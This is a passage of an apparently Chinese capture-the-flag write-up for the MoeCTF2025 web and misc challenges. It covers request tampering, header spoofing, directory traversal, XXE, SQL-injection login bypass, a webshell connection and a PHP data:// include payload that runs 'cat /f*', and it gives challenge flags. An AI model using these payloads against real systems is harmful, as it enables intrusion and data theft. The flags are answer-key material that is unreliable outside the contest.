+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++++ +++++ .++.&lt; +++[- &gt;---&lt; ]&gt;-.- -.&lt;++ ++[-&gt; ++++&lt; ]&gt;+.&lt; +++[- &gt;---&lt; ]&gt;--- --.&lt;+ +++[- &gt;++++ &lt;]&gt;++ +++.&lt; +++[- &gt;---&lt; ]&gt;--- -.&lt;++ +++[- &gt;---- -&lt;]&gt;- ----- .++++ ++++. +++++ +++.- ----- .&lt;+++ +[-&gt;+ +++&lt;] &gt;++++ ++.&lt;+ ++++[ -&gt;--- --&lt;]&gt; -.&lt;++ ++++[ -&gt;--- ---&lt;] &gt;---- .&lt;+++ ++++[ -&gt;+++ ++++&lt; ]&gt;+++ +++++ ++.&lt;+ +++++ +[-&gt;- ----- -&lt;]&gt;- --.&lt;+ ++++[ -&gt;+++ ++&lt;]&gt; +++++ ++++. &lt;++++ +[-&gt;- ----&lt; ]&gt;--- ----- --.&lt;+ +++++ [-&gt;++ ++++&lt; ]&gt;+++ +++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- .---- ---.&lt; +++++ [-&gt;++ +++&lt;] &gt;++++ +.+++ .&lt;+++ [-&gt;-- -&lt;]&gt;- --.&lt;+ +++[- &gt;---- &lt;]&gt;-- ----- -.--- ---.- .&lt;+++ +[-&gt;- ---&lt;] &gt;---- ---.&lt; +++++ +[-&gt;+ +++++ &lt;]&gt;++ +++.- ----- -.&lt;++ +++[- &gt;++++ +&lt;]&gt;+ +++.+ +++++ +++.- ----- --.&lt;+ +++++ [-&gt;-- ----&lt; ]&gt;--- -.&lt;++ +++++ [-&gt;++ +++++ &lt;]&gt;++ +++++ .&lt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124195303683.png" alt="image-20260124195303683"></p>
+<p>moectf{nOW_YoU-h4V3_UNlocKED-VOlumE}</p>
+<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="0-Web入门指北"><a href="#0-Web入门指北" class="headerlink" title="0 Web入门指北"></a><strong>0 Web入门指北</strong></h2><p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124195704316.png" alt="image-20260124195704316"></p>
+<h2 id="01-第一章-神秘的手镯"><a href="#01-第一章-神秘的手镯" class="headerlink" title="01 第一章 神秘的手镯"></a><strong>01 第一章 神秘的手镯</strong></h2><p>附件给的就是咒语，但是不能粘贴，跟学习通一样难不倒我，直接禁用js然后粘贴就行，flag就在shizhou.js中</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124200551026.png" alt="image-20260124200551026"></p>
+<h2 id="02-第二章-初识金曦玄轨"><a href="#02-第二章-初识金曦玄轨" class="headerlink" title="02 第二章 初识金曦玄轨"></a><strong>02 第二章 初识金曦玄轨</strong></h2><p>根据提示抓包</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124200907092.png" alt="image-20260124200907092"></p>
+<p>到&#x2F;golden_trail再抓包</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124201127213.png" alt="image-20260124201127213"></p>
+<h2 id="03-第三章-问剑石！篡天改命！"><a href="#03-第三章-问剑石！篡天改命！" class="headerlink" title="03 第三章 问剑石！篡天改命！"></a><strong>03 第三章 问剑石！篡天改命！</strong></h2><p>就是考察抓包改包</p>
+<p>level&#x3D;s</p>
+<p>{<strong>“manifestation”</strong>:flowing_azure_clouds}</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124201645717.png" alt="image-20260124201645717"></p>
+<h2 id="05-第五章-打上门来！"><a href="#05-第五章-打上门来！" class="headerlink" title="05 第五章 打上门来！"></a>05 第五章 打上门来！</h2><p>目录穿越</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124202518395.png" alt="image-20260124202518395"></p>
+<h2 id="10-第十章-天机符阵"><a href="#10-第十章-天机符阵" class="headerlink" title="10 第十章 天机符阵"></a><strong>10 第十章 天机符阵</strong></h2><p>测试一下看回显是xml</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124203534008.png" alt="image-20260124203534008"></p>
+<p>试了好久都不行，把标签改一下改成输出</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124204630309.png" alt="image-20260124204630309"></p>
+<h2 id="12-第十二章-玉魄玄关·破妄"><a href="#12-第十二章-玉魄玄关·破妄" class="headerlink" title="12 第十二章 玉魄玄关·破妄"></a>12 第十二章 玉魄玄关·破妄</h2><p>蚁剑连一下就行了，没有找到flag文件，就看环境变量</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124205404679.png" alt="image-20260124205404679"></p>
+<h2 id="16-第十六章-昆仑星途"><a href="#16-第十六章-昆仑星途" class="headerlink" title="16 第十六章 昆仑星途"></a><strong>16 第十六章 昆仑星途</strong></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] . <span class="string">&quot;.php&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>题目还给了一个附件，有配置选项</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[PHP]</span><br><span class="line">allow_url_fopen = On</span><br><span class="line">allow_url_include = On</span><br></pre></td></tr></table></figure>
+
+<p>这还说啥啊，直接用data协议</p>
+<p>?file&#x3D;data:text&#x2F;plain,<?php system('cat /f*'); ?></p>
+<h2 id="Moe笑传之猜猜爆"><a href="#Moe笑传之猜猜爆" class="headerlink" title="Moe笑传之猜猜爆"></a><strong>Moe笑传之猜猜爆</strong></h2><p>代码逻辑在&#x2F;static&#x2F;main.js，只要在控制台输入randomNumber就可以得到随机数获得flag</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260126112003658.png" alt="image-20260126112003658"></p>
+<h2 id="01-第一章-神秘的手镯-revenge"><a href="#01-第一章-神秘的手镯-revenge" class="headerlink" title="01 第一章 神秘的手镯_revenge"></a><strong>01 第一章 神秘的手镯_revenge</strong></h2><p>这还要看看这个小说讲的啥了，密码在wanyanzhou.txt，有备份那就有wangyanzhou.txt.bak，还要把密码输入500次写一个代码</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> input = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;passwordInput&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> button = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;unsealButton&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> text = <span class="string">&quot;XqRqsDZWVYjoXvSwMYGklZOGwVpnmPKTPJXhTiFKvhvcseSrXEbawElbdYmJRydaISVcmpLTscDEPSlbIkUNKEvdzivnsrfSCnGolKgQOmVFhxKxhMitBzNeBHNyOgwckpBKdMveKRzqTIrcnvhVgXoxZrjKmuFkFahmHtmTSCKjnjethRbwMPKeJbyLSPAzROgVTuNIChkunCQdCLnoEJWzTscdjGHYzuHJZPMbxqtWteSbkogopAGBxprYdnZEGjfhJfYKlVlVarMHKwlHcIpsHwXgcsvWVKijiTYiQTfpIMHfqyroLmSqLgugtVlDQXeaGTxSWCfkMsMxnucRAxvKeRkUkpnfLrAtMfnBpgwbgLSHsXEPcUxuJwcdxYEfispMnEluMGWPtiKWukWJmcixVbTrgBhRmSqeMWZorscrwsxerZnmKRmbcBIukPQIHOxeoPOXnbngPGdpFrnoDAhCkuQeyDreHKQIutGOwDmQrtuFZYZwPlDMuBZPqPcIDrSHUZvGQKDLARkVfmEQdLeBSVoRAOUJZXAiafPXCMigwuNPzElbajcHnpzBfUvxhDTFvdRsbnvdaYDmyjkNLqrFbRqspCJxrFAJaZkEisEaWkgvnTPTCZvPStbzuAVJRJqcnthlUXbigHdyMERTwFmhGktdbvyHxMWZkIhkMhDUHcrnrqezOsoaZLvifeiFLBUlHJEhtHoStqBtQRenMJPVWLzoFCtBlVSlUaQKnXCedKVGocnoWJiOfnpXVPOxAXQITpeXgfdmszXzOTEdTjqnEPAbQcOfRQFnZPNeygovEvmlhZfKNHQeRcnjHweNceHuFBTciWcFSQNZmIlnpiMkqiQyZOENdGFayRLHRuAHYcFOeZoaWsVwciPUtHRdNxfBtENIVDTPzqnBPdtRdOVWKEaInMAmgTUFSrdghOVOefjxtitiabICQNdLUItQILjyAhCBvnTmzHALWouisBfvTGtHjcYShuKdejEobmfYOypmQRJiKeUAyIGcKPsLDYOVAdIUgujXMsDsOLyrkCqjVAwkJnymwVcIGQPXixGWZWpychnsCINBItKqzcmhoYLWhadHoihjWVBlFgpHKfXpOjXYdhBLjfZUFICrlIEJeDztXIhnMsRITfNhFSjfsQwEktpzryjKvoedbAgFGnIshgIwyJANiKQJzdPdZkckQPVXYAKfekJvIwlQTZOwhjepNEJGhyahbEuNPtkCXVaNVkUvQHRAQVXtAQGTBUlWpZwfuFjKwvjNfzkCmcVeCPUCRSDXKSKQjNOkmeYabmjtNVYclVEredbjBiqXWeMCXaXPltDgneMPJaGIYHyfbWqNLwJCqPsdJxCDvaIuYXDHVLfwPwQuvUGcXvJZmcyACILNBDHnGKXFnUpExHTHrcgyIKCDSzeUsyOYfxnKyAmsUPgWgfdcJuLGAPnLvLnFuKXNUThohGpagqOIucLUtSHYBJvlPzLnJXtBIryPDyWtZuvOcoLBUkWapklHXLNQDonMyunmuoAuqkvdCvWXvIrdXZtHrgwsDuZiytotfKBAMwNGiVDZGlMzPKGpIeFzCLuXYsVXQZfYXoPuBNJyEFNvhlnzDbAieaNycIwKCtysQxbjejrEJVzuaNWpKqaduNtdmAjFpQFKFkoukCGsoscynKmpOTRhBlKlcurfCSzckDmrABkvUnTJBGBjKQeVEZRpfcdNbqEJAGfeaMtKiqfKcmhjngjEuVQaDmgYOdRxGOBGIRBgNCwsUAqNhVxzPkVSkNRLuVbAEApwnXjeipSbNDROtZSuPItgRUIJGcDiSxJwgcqximjKfskPXuHbhowALsYRPrjrteNPhiUKQpFgYlRBHJMuOQPtIYcIPIFHTpwMVpRwRvjpDKzlKmuXZVHAvswCIGoHxMahgaueHzkQhrGXdiXZswbkbpsOFOskXcgBUXBTjXacDJzbqFYhMpQXykStZCMJpmzkBfygwmQERoDIyMCGiJiCmOyTmrepOZIxfPlONsapLxOACdcfxLxsMLUsMziTpqcxAOpFMvghzFYRSwMQmGLDiaQsTZAZurHBSuaFHmXQohjUSqicRyHfrtIKygKBsCdXWTDgzcvHYGnbghSlMeHiMHQZtFoyPoVxyPNgnUxgiXZpXWokTBfnuXLDxqkyBnXWlIwFODufTCoevNmvHKZFAhPNOfuJxnqyfigeihgefMyPRGtjTwPxgkFGleTQOczfIhKVOSAwkfYLzesAxSHaqsWUfdRIxVmgsdedlnRFKHbRIMUHcRELhMLcpGiAJmqmQKECsfpXUvtBcrzRQcORBDNPVlQjdsHZXaHNOhQbdigsdszLIHPnXzqbKhBchruNLjBlaydvIHTVmSlyHtIyCyFocdRlJTozqSQNAvQySRZpNqUPzpQuKWLxUPbhYjvGlEpLWnPenWboqEfEMsAIxdbJQMKfNXakvwtRsTyHMSPOLIGxhLCiEnBnkJLFiDrkLkqBeRqxatdzFjaOVwhEKLAWxHViZadRjfQfoPOnuXPIFLPBnAleremNPcnTwAjgZADfYxlDrtcoQFGubCdTYPFSqXPjOUeAGFuwRvpeQWowxajsTnMcOfPtYBKqJwUQTislZbOsMyBpFCQaQYjSKyxGcSyceUGvtOhxImvTmiMfsmejhFAVALTvdRGAInBuxibmSYloasOJIntRlxjWeQGVklDfBGUkrAfvtNXRVBOvltzigxMUmEIhIjIgwYDWhCUAgQImixmgXDYQHUPRdfNGerNueMivayPSNRheVPTVhPaHDvFPcedCpRGOcAXLBrPnKlyHjDueOZdpfZKabnbdvYilMSALQHjVfkDjXVgsvIyNZEcfobkydwZPfKqTCXgPkPdgVaBmJKIYNmGxStldrBjZAykFDMfoiFIRLGigwdRvilQdycSAuXShvACVReSOifjuWlOSbKhXjfPiYibMxwIOcYtqJDBsbzqsMpsUbnVOVNCBHCVwbaghdaZwKwOcWsFdTxICJWXrEgJKWVrtPLUnYehdKUIbHUxWvzflPvLJMIJdoPNcjlPyZuYbrNgznMPDQIskYGeKHEIxbsAzFGPSbHEYIfnakwrHtifynYQBGcIMtEfSTmzltyveQBEdyrPHurWSEPiEGaGFHNtYqFqZSvMOkfEkFGNUNehiTqrLJMZPmjBSlnkLaQtjTslRqwOSmxZdQzpgBzTFVxLtBnUspHSqUyBLXbRMViuwZnVFyEFEyzlISCdtwpnKanKdroLgotHdEhGyucMuGyqStCiZbxKIlMLvuhLTUNbmXYhZbfTrHGlYbMjsXAiQovPHQrfvEjkiZVgyhEVPRkTzyAucZgafPFGOBXcSkOXKdlZrZpXQOJCKLtzBysNKVkHEgyrQPqnUKXILyujGsFqXzfLpDjewEmzGrGhRCSumVlXrwoBXRljkWHGDUsNUAdZKUDOwejOZifSOHJHiKCYNGtbdQEPaFKPnaYQzfxzGefKtAbRuJoZmHblZmwKrODQVMUOqmIZOuxzraxWdtpcRHFZCJlTdMcQLFVuTlOQNCkEPkRTFPLVNAqImzvpsWcNMPIvulFEhoWSDXlwpeBZxKIZApQOArGWITaVteYWBoEkHlPjHkQwxDnRfDyRXqjbzVgYcTDsMafXLustotnGcrbNyDimSxCiatNVnKgnTuyUYJtUdSAgJwLeFSPuAIfvbaxYNwRgDoGtaQcFxgDJMFgpCIuoEdwDChkoBVfDkaihdmPQZTwGcyNiSHpXLZfrszPoroaFSFoyZVysuPgwQpEQWQYqwLmfSCktrnuAUktVGnDvspNePKtABerKUsrjhJZnBtEsiRwoGDYVoSxzhDbLWysDJUWECVbNDtZEPLawlSblaIPtIfLJxpaJQnXQgVKIuWDZLmAlWfzxGmxEjtpLBmJCsvCyMemqylTnRXgqCzhfROrdtdPcrHtntoGyKnqjigbEfkdykWKlwQruRiDIVequOEJbHXdQCMIQAMTDXLQTgcLqmQlStExIAKMlNSXuhnUgYwTlVrqpadpTAzvLsTcopFOraXmxqCGqDiZhyUcWdraLNaxYlDTdjVkjHaWLVNDKvrDotXPOdLwPKGHiTpWzghIyopFBMJPEjaQlNJhZHctpMgvUawLrLnyuTxCejCavTOgQBwDFOdIZeawkGNWmwUzFauLxsqimLVSnEWPZYRAKHwHIWjCrPjtXTCeaCkVlrjRzhEvlwmnmrjlPqioroJpZDvJXtpOtHmsQheWgUnuDqjLUjWSzgdmuHBiNGsexkrxWqjIWCesrmJFgsLALwDKaONSCnKGTYvSHqsCdEnJmKbItitgTOlSigmioFqtEyaUKpqtYhWUBrtsLcfmfqojPScvTayNOmiJvAfczBUCUqdZexCqfBjsufdVdlKQWSVLfCnBydqAmVdhAnlSfrOTAIrgVXueYGjoJIByCoEJRtomAUqrTIcvnIdMoMjXkTEUjEwtEWorwefkTGalPEPnCJRjZJPHOWMPswlApIuNblsAXKXEnoxsaIwvhyOkHyMiYiFoCjXfgwlpiETVoUDfVqFpXclvKnwinPNHDRhnQwJZjATsqslVLeSMwSCIJTnatMuxMcAWrJdnwjWxYKHmJHOyEceCfwsmalGwVtJNXLpikQdhMYDYKFCxGrtSNaceCVuiEvQyBFycgCSwvAVjulXqbreazYTZPRhZdYqsvNKQfRpqITJXYZEizdNUCSRlNUKSGIrgLzBRdWfSzEObyJyCDlspgNPukmbIDwloSGWPXUbnoZPaZISqjkGlRihGcOtHmkwFBrhGIxutiLOZLfIvLpkQpcKcJvcYSoMXqiNYgrGvfTHFmKCwgdIGNmWPcwyfJhIphUJYjAMgFPzPMoWjElspZCbXDkQzihAwSlxNztzMbaUxEXhAizBxopqZMYazFBXQtBXSncriVJTgLbZrNfGFjctMTEmObPLpENwnovQHnBnPqYhFkqVkdqRoNoveCdoTGmgzlRJatIpByQGpjelGEmTGHELfxsIruzldvLMihnPzhLrfKMgCVOSOvDUrYhiuxnlVNgtilbQwoWbyMciXOQsfegmznLtaMzunRDscsnQCvZcwjtLWkuvidyjSGOSWGIRGzGyWcqjyJiWejPzIdfzLGaCSvNqhwEqAvCxcGVspJnyMgiXHOfetWgMeWGmoXHsXIucVwEvHaDWbidGZaTMzYTrKQPwbDbcRnUDymaMhuTYPlWqdNsTngReMqSvwDeBIjkIfDTnJwNvaUMdCrSiJYxbYAHgyTIvThjptWEDlhEBuIvrgkiRpsVpTruBKuJAZRHFBTBAxqKjyZVtscfYoJAwrvmpWCYxWAcvOjOGWuvphnjoTcpcyopaHPSYNSFpLhdsVqusxufxbwZjzwhGHjsCkvWUDHioXebCGemDKSutHqiOCImIhsvMcgfSvMcuvAdEhuRbDHqeVFzIMwUTjZrBNzfwcenAucPrjhOKOFXNKnwRBdiucOjdraiEGfDChPLiYkEnifjEoIDjRSDuNBDMRDxtCDLscfXtRCNZxWfYeKCpzYBiSrMoIpUbRklzEVwQVehVpkFyVrVtujiSPOLEFOVhCrDWChnroYGOLFwItVbxfZlzjkgOvdAEdTjLebjyKHSEYvMduWainHlZHbtIADMtmXOjyaVsasBDemSCOuLaFeAMatFmqPYgoPBuwgfhxpMngLGthLNaDRySnrXiuXGdsXebrmUvdueGmUSmhIuXJOVGpOhqwtzIcuirDThNsyLdExgVmHqUptlwLJVQwSlZOuVTHrbfRhuibwpkJwJkDPUGwGLyZorkRskRTqaeHlClCjQyOPZTmNzpDHxndJVsxAnpLuqHNktLHrGaPKTeDlhKWtxUltveFDgBERTnKHaSHdaZDKPxlKWmvGnQCLZJgSaVRplUSjaXjseKhXlMxdvTYJNsOgislKzLnepaxWECaTCflPMuJzOCMdBgCribrHLGlpBqTkTEcVHgoGQWUjVTUzjyPUhWbiBRxckxGThXqexUSgFmtfdYtKhTWtfjxoPiMYVBqERcWxoRkQSkULJiPhCSfXoUykfGSimlmHBHzWbsagTJdgYoKFuAjXCqKvnukUclWZVANxeRvCXUqojAgEaByFkNKxLgKObKgsHRijRzxQVaUprskCmATLwvgiDyIndpeaSiPljfSAhRtLwEtJBODxjtyMzIomksXUGbskQjSPdgwxJWaejgnfxwJrdHgMCrSrwBTuGfcojXVLWNClYvzJTyDXrLzkSqxbcLHdvcFMnwGMwLERmcmDUQuIvUdjIcJKXULTyPchlWLxVpuihKemfgFJfGApvzAnjShbxKUqAtBDPtpIgEKdyidUqNJocWbnPEbMxCZhRUjTrVteNiFDVmNaMBNetaWEtafXncKfEXYptvijKGuiZXgmoFBTHBriRIcDBdZJIaymIuZkNuZKWmpTLhScjTiJrKJDXvZeGVNJTDINafpQwiPkqbIvgqCTwkCWhZrgQIHuBkBgwOnOTCEHRxpaGbMJrsgLEOInhVKIwhIhgVjtqArCYijwoMhnsOqziDfnIZEfDaUOhSVyqhWKZIJsJfNWIStPqbyFmZPlnLYwbSoEkxwRSTfznbOGYrSjCSRlPEytycnVXAesjgQsMjuetJvdGSjxoNwufCPvxMUqDPKeQTsXQcIRQGoqCUDbZlHbYkFqJhruVmRiWGpDiPSKXOsBHvPvJNgaSOSHrNUiOwvBUgzWrTcBWAKrkBMobfONCzmXbRHganRgFJZsgvwTmkLiXfkyqcYjSWHKoSoyWOgoFGhXPturGEUCuIVBczaLnxzUkmwFbKAkcXuzaiByLNEaugBXnkXtuAqDKuMtMxGCKQHPIWtwkXoEXaCzqVnlmTueyDsKmQuqOBPekMIfdiSbHDVFbhbaUVPIFPchCuZxFBRaKceldvAWvgIkroVrHpvIEiHqBIYxGyueUVTWPoDZRnrAStGFHwYczxVuPKXEUHFpHDjHcDZTmWhBmfTJvRSLUYhieMwGCDevGSfMBPzEOGiwsGbgmUfXYmnraIfPRxPuvkOrDVrAqfTOrvcXhUSHYJPbhqOUAFepOuGwEuoKcOtrpbZKOFCziyUpAXzSWXDidtDCFnlIqaCfzWNogViWoPhSnZYESkYRoiaoaETPhnswIXoGhbRpmWkFkOvPmoWexFEGntpePDBePblefuMvqBAtehBAzYdOstJLrymkahWgKhftLgmHZpBNeGmKcZafkLkRMIAWkqWYdxPYQkQewixKynMQMrqCiMwSZjELaWecgsqphcanAFEZycECYiSBoajuMlZdlYQtPejrvtYRsugRbVlFaWDbGAsVOAyERmNDPswIlDoyhZuWqonEVztwxyrmcyVmvCYkjZjwmzhTfnDSLIzgbxgAXLGptfGhVnXpktjfCzbLNtojTmpUekDrsIPYPXPsQroMOwMLvTnUnqnmzqASbduRJeGNAmgKvprEHOyGTFJWbafwEdxphKzOviNwfPrBuGwCYZhOVwirGHQDRtsfPCVgEmpsdAJEXBzfnRYiaqJRyfOFGadaJSXhfhsKfiCbakLbfENXFXdhpyADSNbDmQWUpbPMtCkxsRGJoaKcLgeKmzqSoHaLoSuAWZqvIMfCiEfyCmGPadaHumUlFWrntbTNqukENBzEFObGrNTXNbKBhXCupKDIJNykATKfBQvzSYgQELWUfepXnBFncFqCHCTxCLMfPUpaUkRtoJMbpadzmyHfQEHpGatSqZohDJBxMajbXdRFsHTpXzTDgYRnpfzVPEFsknYZaXdNezYIZTeczgOZTlYhylchNEHivrFhihcxYNIcDGixscIDYkbEYuloZqdmFLNaFDUGcgMQvlYwJSdsPgvuseuOAYiaFOnkCrJgWnRCJuHGZEyLJEuEDedwphNLMrpdvgRVENLRpcMaqwgOwrVOjcjgSahSTAOxiYlQpsbApqtqYQrOpczjaTnvxhUclzYJuqpLalVRmLZlieUNefYNLwJNJZhoUxtOxLDTQXJlswXMprgjwOPDPGiVNtQxzshImKZNvZtXIRiMsIhqjyIBurirPcwVaTbKqiTFtzbzHkjPIBYeKTSNrmNHnZgdrxAkJmOyKZWPIsQvxFSriYRSkABozQclJizGaKitcrfWowxpNKmzCsqwTbocXjKfujNSRKWUyUWqrhXtgLSXgItLZtorjiKPzinOxdvPGvYZyPLfvlAMIqUgSCmhNExifbfwPlriPnYVljZvzWEqXdiTYDzjhYgoiYJZfpqhrkLdcxkMIXDFBnFEVXlvHtaloYiNTPYRvDgwfWmwKRspCelMYAghSUjskGmnjDJWIMYMYPEaoqiYEZnCyzEIprFumcLiVPKjObkUpdirdoDzBLGvikaEmXjTMpEdxmsAqdfwOrqrSwxBWXdfbuAtEdPYZRqnTaopFjvplSHOntxIFjnjvnmlUtofmyRegkaelImWYDHJpbfyDEHbGFeHRZngNyKOsarinDhJZTrdNxltQOnwoKrkHsTKofRymjVSNdeRFvrlRVclbFUJlNbiENwOeAMeTCuBoJFZMrgtegqcRKQdaFpwhcUFOZsfMTkviehQFCAvZborgWjSYhWQzHAsKmEgwfWmJYvHTPuSKOmOyFjgkvHIuPIbralqLBDQiDutlcUxmcXdSYgemREgfLVQNcNerMnuCkqnrYzisxzOxnBfCJQfGTvxbvnPHRzImrOGNvjCYWnGQrBotaUgZcHjfHBqsUrgYQspgqTjsxUvrmdpLebKgSivumvjIkoqwCeBpJwbHvOpkWQwVREFOyFaeDzPelPykaxDumJRzGMQlvqDhFySqDzTRxpWLESyWDrcBIBHxESudenUdquFVwTjITmaqngtgRjhSLdtXcNPFVkgWyHEofdAvLsFlmKlHZQxZWCXqtyndzRHfwZxjtGcLjcRNxazLDqtMqRabYxyCUKxNcaFkAJMiJaqGLQthPIYvQeusnmGJuVTEtkPzKoTYDERTHrIwhSxDubOapIcYQLZrpJiJhiKrLVjQKubkrwDJSwAtmnrCXUFYZWLGlyZBYigmUtpTzyLFRYEWlOjSEDqmQktdvUFVSuHZwNRXWmfUjMOwpHmSwXnXzUyUkEYMWVUePdEsvPEUeWnkXJcfaOubzFhLQbvMSolejybMvLuJYbkxgZQLAMyRfOAPjsCobsovaWawNcmRHfmCNlkRWbZEhGXQMrlWAreWJtlISGlxdJHNmzQhuFuYLIdkdYRaYJWpFbZHbNvcmGukGSyKoLwVANVJrkXJGoVJWnIrIniacQVsvUEsUioPnoYhyCUsegXOsRcvcHxZfpmRkJUxyjYaZvFrnmIFAmzindESEskJVJmCnGhehMhLCoAMbCENszFLXchIwUizywEFxEJsizGlCrEWmhLWmpbFeOrbEhEgFkpelexDQkHXHlYjOANomnxlPZuByRZLDpdXLAZDZocOupMonVtIoBlaPUvMDpZvmKhNyPXZLEMWgjEBUPQBhZjvBNCSkuqMreXSCbudhGAmYiTEBlUDoRsZgTPVnlFaYIrvOPvbFkiCxbCDhlEmvpsjSgdEXtYgOxdVTPvXeftPzdsXUfhfQtPIEIcQnGYernWaFJyfDcDxNoHmfWzQGrGqnrhCPVmJavXBLChpGialPrUSTDHcMlJedpdFDKDZIHJPRMCmBaXkYFqSIFYpqJrlEBpzDGROVdkLWSZdzuRHwQJoPkVIvRUDpWXqVbzWLUPNSHEKwIvmojanGqGAUpODlgnWPOUjHpSGnKrOkDPAKAXtLGifiudqSKegAUCNbvBpaeJFHqyvAjdiyfTRpqCNlDVEISCZUfvnIFtxReYGwCXIhwcDbevHcDGQOLpzPHgcuojXiZdSoRYgoVmduqghYIYLmQWKvKCaZHtSNOMnHeQxskuQRebzDvRigACxBmCRagYpmtpb&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> count = <span class="number">500</span>;</span><br><span class="line">    <span class="keyword">var</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> interval = <span class="built_in">setInterval</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= count) &#123;</span><br><span class="line">            <span class="built_in">clearInterval</span>(interval);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        input.<span class="property">value</span> = text;</span><br><span class="line">        button.<span class="title function_">click</span>();</span><br><span class="line">        i++;</span><br><span class="line">    &#125;, <span class="number">10</span>);</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="04-第四章-金曦破禁与七绝傀儡阵"><a href="#04-第四章-金曦破禁与七绝傀儡阵" class="headerlink" title="04 第四章 金曦破禁与七绝傀儡阵"></a><strong>04 第四章 金曦破禁与七绝傀儡阵</strong></h2><p>get传参就行</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260126115242468.png" alt="image-20260126115242468"></p>
+<p>bW9lY3Rme0Mw</p>
+<p>第二关post传参，declaration&#x3D;织云阁&#x3D;第一</p>
+<p>bjZyNDd1MTQ3</p>
+<p>第三关抓包添加X-Forwarded-For: 127.0.0.1</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260126115542589.png" alt="image-20260126115542589"></p>
+<p>MTBuNV95MHVy</p>
+<p>第四关修改ua</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260126115724418.png" alt="image-20260126115724418"></p>
+<p>X2g3N1BfbDN2</p>
+<p>下一关改cookie</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260126122111010.png" alt="image-20260126122111010"></p>
+<p> M2xfMTVfcjM0</p>
+<p>下一关</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260126122156489.png" alt="image-20260126122156489"></p>
+<p>bGx5X2gxOWgh</p>
+<p>下一关</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260126122756900.png" alt="image-20260126122756900"></p>
+<p>合起来就是</p>
+<p>bW9lY3Rme0MwbjZyNDd1MTQ3MTBuNV95MHVyX2g3N1BfbDN2M2xfMTVfcjM0bGx5X2gxOWghfQ&#x3D;&#x3D;</p>
+<p>base64解码</p>
+<p>moectf{C0n6r47u14710n5_y0ur_h77P_l3v3l_15_r34lly_h19h!}</p>
+<h2 id="06-第六章-藏经禁制？玄机初探！"><a href="#06-第六章-藏经禁制？玄机初探！" class="headerlink" title="06 第六章 藏经禁制？玄机初探！"></a><strong>06 第六章 藏经禁制？玄机初探！</strong></h2><p>万能密码一把梭</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260126123425252.png" alt="image-20260126123425252"></p>
+<h2 id="07-第七章-灵蛛探穴与阴阳双生符"><a href="#07-第七章-灵蛛探穴与阴阳双生符" class="headerlink" title="07 第七章 灵蛛探穴与阴阳双生符"></a><strong>07 第七章 灵蛛探穴与阴阳双生符</strong></h2><p>根据题目描述是robots.txt，然后有一个flag.php，访问后得到代码</p>
